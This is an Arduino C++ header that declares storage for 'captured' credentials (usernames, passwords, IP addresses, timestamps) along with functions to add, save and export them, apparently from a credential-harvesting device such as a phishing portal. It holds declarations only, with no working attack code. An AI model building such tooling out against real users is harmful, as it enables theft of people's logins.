#ifndef CREDENTIALS_H
#define CREDENTIALS_H

#include <Arduino.h>

#define MAX_CREDENTIALS 50

struct CapturedCredential {
    String username;
    String password;
    String ip;
    String type;
    String timestamp;
};

extern CapturedCredential capturedCreds[MAX_CREDENTIALS];
extern int credCount;

void loadCredentials();
void saveCredentials();
void addCredential(String username, String password, String ip, String type);
void clearCredentials();
void exportCredentials();
void credentialsSetup();
void credentialsLoop();

#endif